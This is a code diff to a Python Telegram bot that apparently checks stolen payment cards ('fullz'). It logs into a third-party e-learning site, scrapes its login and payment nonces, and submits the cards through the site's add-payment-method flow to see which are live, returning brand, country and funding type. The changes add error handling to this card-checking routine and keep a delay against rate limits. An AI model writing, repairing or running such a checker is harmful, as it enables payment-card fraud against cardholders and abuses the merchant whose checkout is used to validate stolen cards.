@@ -44,7 +44,7 @@ def gets(s: str, start: str, end: str) -> str | None:
         return None
 
 # CREATE PAYMENT METHOD WITH EXPIRY VALIDATION
-async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
+async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
@@ -88,6 +88,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         response = await session.get('https://elearntsg.com/login/', headers=headers)
 
         login = gets(response.text, '"learndash-login-form" value="', '" />')
+        if login is None:
+            return "Login token not found", '', '', ''
 
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -175,6 +177,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)
 
         nonce = gets(response.text, '"add_card_nonce":"', '"')
+        if nonce is None:
+            return "Nonce token not found", '', '', ''
 
         headers = {
             'accept': 'application/json',
@@ -219,11 +223,10 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         try:
             id = pm_json.get('id')
             brand = pm_json.get('card', {}).get('brand', '')
-            last4 = pm_json.get('card', {}).get('last4', '')
             country = pm_json.get('card', {}).get('country', '')
             card_type = pm_json.get('card', {}).get('funding', '')
         except Exception:
-            return response.text
+            return response.text, '', '', ''
 
         headers = {
             'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -256,7 +259,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         return response.text, country, brand, card_type
 
     except Exception as e:
-        return f"EXCEPTION: {str(e)}"
+        return f"EXCEPTION: {str(e)}", '', '', ''
 
 # FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
 async def charge_resp(result):
@@ -538,7 +541,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # OPTIONAL DELAY FOR RATE LIMITING - CAN DISABLE IF WANT FASTER
+            # DELAY FOR RATE LIMITING
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
@@ -564,5 +567,4 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
 
